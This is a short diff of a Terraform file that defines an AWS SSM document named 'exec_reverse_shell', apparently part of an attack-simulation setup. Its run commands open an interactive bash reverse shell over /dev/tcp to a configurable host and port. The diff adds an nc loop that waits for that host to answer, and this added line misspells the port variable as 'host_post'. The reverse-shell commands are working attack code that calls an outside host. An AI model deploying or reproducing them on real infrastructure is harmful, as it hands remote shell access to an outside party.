@@ -25,6 +25,7 @@ resource "aws_ssm_document" "exec_reverse_shell" {
                     "timeoutSeconds": "60",
                     "runCommand": [
                         "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
+                        "while ! nc -w 1 ${local.host_ip} ${local.host_post}; do sleep 5; done",
                         "bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1  &",
                         "echo -n $! > ${local.pid_path}",
                         "touch /tmp/attacker_exec_reverseshell_target",
